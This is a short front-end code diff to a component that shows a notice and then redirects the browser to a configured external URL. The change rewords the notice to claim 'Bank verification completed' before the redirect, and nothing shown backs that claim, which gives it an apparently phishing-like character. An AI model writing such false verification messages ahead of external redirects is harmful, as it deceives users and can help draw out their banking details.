@@ -63,7 +63,7 @@ function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void 
       try {
         const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
         if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
-        onNotice('Verification completed. Redirecting you to the delivery review page.');
+        onNotice('Bank verification completed. Redirecting you now.');
         if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
         pendingTimerRef.current = window.setTimeout(() => {
           window.location.href = parsed.toString();
